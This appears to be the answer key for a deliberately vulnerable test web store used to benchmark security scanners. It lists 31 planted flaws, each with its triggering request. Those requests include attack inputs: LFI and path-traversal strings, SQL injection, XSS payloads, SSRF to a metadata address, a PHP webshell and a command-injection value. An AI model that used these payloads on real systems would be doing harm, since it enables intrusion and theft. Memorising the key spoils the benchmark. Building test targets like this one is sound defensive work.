# Vulnerability catalogue (the answer key)

Every planted issue in Northwind Store, the exact request that demonstrates it,
the CVE it maps to (where relevant), and — where one exists — the **secure twin**
that does the same thing correctly. All data and secrets are synthetic.

The app presents as an **nginx + PHP 8.1** stack. Assumes it's on
`http://localhost:8099`. Tiers describe how a scanner reaches the issue:
**passive** (read-only observation), **safe-active** (non-destructive
exploitation), **exploit** (mutating / interaction-driven).

> The two flagship exploit fixtures (file-upload webshell, command injection) are
> **simulated** — they reproduce the observable behaviour but never execute
> attacker-supplied code. See the note at the end.

---

## Known-CVE / version leads (fingerprint the banners)

A scanner's version→CVE track should fingerprint the `Server` / `X-Powered-By`
headers (and `composer.lock`) and surface these. They are **leads** — a banner is
not proof — so confirming/exploiting them is a separate, higher tier.

| # | Issue | Signal | CVE |
|---|-------|--------|-----|
| 1 | **NGINX Rift** | `Server: nginx/1.30.0` (≤ 1.30.0 affected) | CVE-2026-42945 — rewrite-module heap overflow, pre-auth RCE (CVSS 8.1) |
| 2 | **PHP2Shell** | `X-Powered-By: PHP/8.1.2` (< 8.2.35 affected; EOL branch) | CVE-2026-109618 / -109619 — PHP-core RCE via `session.upload_progress` UAF (CVSS 9.2) |
| 3 | **Dependency versions leaked** | `GET /composer.lock` | exposes exact `monolog` / `guzzle` / `twig` versions to fingerprint against a CVE feed |
| 4 | **`phpinfo()` exposed** | `GET /phpinfo.php` | full PHP config: version, `DOCUMENT_ROOT`, `session.upload_progress=On`, empty `disable_functions`, a DB URL with credentials |

---

## Passive — observable without exploitation

| # | Issue | Trigger | Signal |
|---|-------|---------|--------|
| 5 | **Secret in JS bundle** | `GET /static/app.js` | `stripeSecretKey: "sk_live_…"` embedded mid-bundle |
| 6 | **Secret / internal host in source map** | `GET /static/app.js.map` | `sourcesContent` leaks a DB URL + `metrics.internal.northwind.test` |
| 7 | **Exposed `.git/config`** | `GET /.git/config` | reveals `git@github.com:northwind/prod-secrets.git` |
| 8 | **Exposed `.env`** | `GET /.env` | `STRIPE_SECRET_KEY`, `AWS_SECRET_ACCESS_KEY`, DB URL |
| 9 | **Exposed DB backup** | `GET /backup.sql` | `INSERT INTO users …` dump |
| 10 | **Dangerous CORS** | `GET /api/data` with `Origin: https://evil.example` | reflects the origin **and** `Access-Control-Allow-Credentials: true` |
| 11 | **Missing security headers** | any response | no `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options` |
| 12 | **Verbose PHP errors** | `GET /api/crash` (or a bad `/product.php?id=`) | `Fatal error: Uncaught PDOException … in /var/www/html/includes/db.php` + stack trace |
| 13 | **Directory listing** | `GET /uploads/` | lists uploaded files |

---

## Safe-active — non-destructive exploitation

| # | Issue | Trigger | Signal | Secure twin |
|---|-------|---------|--------|-------------|
| 14 | **Unauthenticated PII API** | `GET /api/users` | names, emails, **SSNs** with no auth | `GET /api/catalog` (public-by-design) |
| 15 | **IDOR** | `GET /order.php?id=1002` | reads another customer's order; ids sequential & unauthenticated | — |
| 16 | **No-auth admin console** | `GET /admin/` | full user table (PII) + delete form, no login | — |
| 17 | **Local File Inclusion (LFI)** | `GET /index.php?page=../../../../etc/passwd` | front controller includes a user-named path with no confinement | `?page=about` is a normal page; fix is an allow-list |
| 18 | **Path traversal (download)** | `GET /download.php?file=../private/service.key` | escapes `/srv/public` and returns a private key | in-bounds `?file=quarterly-report.txt` is fine |
| 19 | **SQL injection — error oracle** | `GET /api/search?q='` | `500` mysqli syntax error leaking the query | `GET /api/products?q=…` (parametrized) |
| 20 | **SQL injection — boolean oracle** | `GET /api/search?q=zzz'or'1'='1` | tautology surfaces the hidden `Prototype — unreleased` row | `GET /api/products?q=…` |
| 21 | **Reflected XSS** | `GET /search.php?q=<script>alert(1)</script>` | the query is echoed into HTML unescaped | `GET /safe-search.php?q=…` (escaped) |
| 22 | **Stored XSS** | `POST /product.php?id=1` with `review=<img src=x onerror=alert(1)>` | review is stored and rendered unescaped on the product page | — |
| 23 | **SSRF** | `GET /fetch.php?url=http://169.254.169.254/` | server makes the request; no allow-list | `GET /preview.php?url=…` (never fetches server-side) |
| 24 | **Open redirect** | `GET /redirect.php?url=https://evil.example` | `302` to an attacker-controlled destination | — |
| 25 | **Client-trusted price** | `GET /api/checkout?item=1&price=0.01` | server charges the client-supplied price | `GET /api/checkout-secure?item=1&price=0.01` |
| 26 | **Insecure deserialization** | set cookie `remember=<base64 of a tampered PHP-serialized identity with role=admin>` → `GET /account.php` | the forged role is trusted; the account shows **admin** + an admin link | a signed/validated session would reject it |
| 27 | **Credential / loot chain** | sign in → `GET /account.php` leaks `api_key` → `GET /api/privileged` with `Authorization: Bearer <api_key>` | any customer key unlocks a full privileged dump of all SSNs | — |

---

## Exploit — mutating / interaction-driven

| # | Issue | Trigger | Proof | Secure twin |
|---|-------|---------|-------|-------------|
| 28 | **Unrestricted file upload → webshell RCE** | `POST /upload.php` (multipart) with `avatar=shell.php` containing `<?php system($_GET['cmd']); ?>`, then `GET /uploads/shell.php?cmd=id` | the uploaded PHP is served and "executed"; the command runs as `www-data` *(simulated)* | `POST /upload-secure.php` allow-lists image extensions and rejects `.php` (`415`) |
| 29 | **Command injection** | `GET /tools.php?host=localhost;id` | the injected command runs after the `ping` *(simulated)* | proper arg escaping / no shell would prevent it |
| 30 | **Privilege escalation (broken access control)** | `POST /api/account/role` body `{"role":"admin"}` | the change **persists**: `GET /api/account/profile` returns `customer` before, `admin` after | `POST /api/account/role-secure` is refused (`403`); `/api/account/profile-secure` never moves |
| 31 | **Interaction-only DOM XSS** | open `/cart.php`, type a payload into the promo field, click **Apply** | the value is written to `innerHTML`, so markup executes — invisible to a plain fetch | the sink would be safe with `textContent` |

---

## Notes for scanner authors

- **Simulated fixtures.** Issues 28 and 29 return canned, realistic output for a
  small allow-list of read-only commands (`id`, `whoami`, `uname -a`, …) and
  **never execute anything**. They exist to demonstrate and be *detected*, not to
  provide a real shell. The HTTP behaviour a scanner observes is faithful; the
  code path behind it is safe.
- **Secure twins measure precision.** Flagging `/safe-search.php`, `/api/products`,
  `/api/checkout-secure`, `/preview.php`, `/api/account/role-secure`,
  `/upload-secure.php`, the in-bounds download, the benign `?page=about` include,
  or the public `/api/catalog` is a **false positive**.
- **Chains beat endpoints.** Issue 27 is strongest when a tool recovers the key
  from `/account.php` and *replays* it against `/api/privileged`. Issue 28 is
  strongest as upload → request → command output, not just "an upload form exists".
- **Version leads vs. confirmation.** Issues 1–2 are banner matches: a good report
  flags them as *leads to confirm/patch*, not as proven RCE (banners can be spoofed
  or back-patched).
